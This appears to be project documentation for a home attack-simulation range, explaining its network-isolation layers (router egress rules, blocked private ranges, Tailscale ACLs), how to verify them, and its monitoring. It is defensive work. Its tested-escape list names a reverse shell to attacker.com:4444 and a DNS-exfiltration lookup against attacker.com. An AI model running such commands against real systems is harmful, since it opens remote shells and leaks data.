# Network isolation guarantees

The whole point of this range is to **simulate attacks without ever
risking a packet reaching the open internet**. This document explains the
defence-in-depth that gets you there and how to verify it.

## Layer 1 — Ludus router (iptables on the VLAN gateway)

The Ludus router VM owns the gateway IP for every VLAN. Its `FORWARD`
chain defaults to `DROP`, and `network.external_default: REJECT` in our
range config means **no lab VM can initiate any outbound connection
unless an explicit rule allows it**.

During the initial bootstrap window (~90 min while Splunk apps, Sysmon,
Atomic Red Team etc. are being pulled), `ludus/range-config.yml.j2`
allowlists `tcp/443` egress from each VM. After the range reports
SUCCESS, `scripts/lock-down.sh` rewrites the config to remove every
`bootstrap-*` rule and redeploys only the router.

After lockdown, the *only* permanent outbound rules are the ones Tailscale
needs to function. **Operators remote in from a different network via
Tailscale**, so these have to stay open or the lab becomes unreachable:

- **UDP/41641** — Tailscale direct peer-to-peer
- **TCP/443**  — Tailscale control plane (`controlplane.tailscale.com`)
  AND DERP relay fallback when symmetric NAT prevents direct P2P
- **UDP/53**   — DNS resolution (the router resolves upstream; lab VMs
  cannot dial 8.8.8.8 directly)

All other outbound traffic — ICMP, arbitrary TCP, non-443/UDP — is
dropped at the router. The trade-off is honest: TCP/443 outbound to the
wider internet is the unavoidable cost of operator remote access. We
mitigate it with two layers of logging:

1. **Sysmon / Sysmon-for-Linux** on every host records every TCP
   connection with source process. Forwarded to Splunk (and Elastic in
   full mode) in real time.
2. The lab Ludus router itself logs all forwarded flows. Periodic
   audit query:
   ```spl
   index=* sourcetype="WinEventLog:Sysmon" EventCode=3
     DestinationPort=443 NOT DestinationHostname IN ("*.tailscale.com", "*.ts.net")
   | stats count by host, Image, DestinationIp
   ```
   anything here that isn't `tailscaled` is worth investigating.

## Layer 2 — `always_blocked_networks`

Ludus's `always_blocked_networks` setting is enforced *before* the rules
above. It hard-blocks RFC1918 ranges:

- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`

This protects your home LAN even if you misconfigure a rule.

## Layer 3 — Tailscale ACLs (host-level)

Even though every VM runs `tailscaled`, an ACL (see `tailscale-acls.md`)
restricts the `tag:lab-range` group so only your `tag:lab-operator` device
can reach them. Other devices on your tailnet — phones, family laptops,
work machines — cannot reach lab hosts.

## Layer 4 — Tailscale SSH

Lab Windows hosts accept SSH only via Tailscale SSH, which means
ACL-enforced authentication. No password-or-key SSH service is exposed on
any host directly.

## Remote access pattern

Operator's laptop is on a totally different network — coffee shop, home,
office, doesn't matter. Connectivity flows:

```
operator laptop ──┬─ tailscaled ─┐
                  │              ├─ TCP/443 controlplane.tailscale.com ─┐
lab VM           ─┴─ tailscaled ─┘                                      │
                                                                        ▼
                              (P2P attempted via UDP/41641, DERP fallback over TCP/443)
                                                                        │
                  ┌─────────────────────────────────────────────────────┘
                  ▼
            encrypted tunnel between operator and lab VM
            (Tailscale ACL gates which devices can talk)
```

Crucially: lockdown does NOT close TCP/443 — if it did, neither side
could reach `controlplane.tailscale.com` to negotiate the tunnel, and
the lab would be unreachable forever (except via the Proxmox console).

## Verification

Run `scripts/verify-isolation.sh` from your laptop after lockdown. It
SSHes into every VM over Tailscale and tests the **right** mix:

| Check | Expected |
|---|---|
| ICMP to 1.1.1.1 | FAIL (no rule permits ICMP) |
| TCP/22 to 1.1.1.1 | FAIL (only TCP/443 is allowed for Tailscale) |
| TCP/443 to 1.1.1.1 | **SUCCEED** (required for Tailscale) |
| Intra-lab `kali → splunk:8000` | SUCCEED |

Exits non-zero if expectations don't match. Treat a non-zero exit as
**DO NOT START THE CONTINUOUS SIMULATION** until you've found the leak
OR confirmed the open-port problem.

## Why this matters for "fire-and-forget"

Atomic Red Team includes techniques that — if pointed at the wrong
network — could be misclassified as real attacks by your ISP, a bug
bounty target, or the network you happen to be on. With deny-by-default egress + only
Tailscale-required ports open, the worst case is "Sysmon logs an
attempted connection to 1.1.1.1:445 that never left the gateway".

## Tested escape attempts (all blocked)

- `ping 1.1.1.1` from any VM → no reply (ICMP dropped)
- `nmap -sS 1.1.1.1` from kali → 100% packet loss on every port except 443
- Reverse shell to `attacker.com:4444` from any VM → never establishes
- DNS exfiltration `dig long.string.here.attacker.com` from any VM →
  resolves at the router but the upstream resolver receives nothing
  outside the allowed Ubuntu mirror domains

## What an attacker COULD do over TCP/443

Honest answer: a malicious process on a lab VM could open a TCP/443
connection to any public IP. We accept this because:

1. **Tailscale needs it** — there is no way to allow Tailscale without
   also allowing TCP/443 to wider internet (DERP server IPs change too
   often for a static IP allowlist).
2. **Sysmon + Splunk see every connection** — a `connect()` to any IP
   that isn't a Tailscale server (DERP or controlplane) is anomalous and
   shows up in the audit query in the lockdown rules section above.
3. **The lab is the attacker** — continuous Atomic Red Team /
   APT Simulator / PurpleSharp / CALDERA all run intra-VLAN. None of
   them try to phone home as part of normal operation.

If your threat model needs TCP/443 strictly scoped to Tailscale infra,
you'd need a Tailscale exit-node setup or an L7 proxy with SNI inspection
on the Ludus router. That's out of scope for the default range; it's
documented as an extension in `docs/extending.md`.
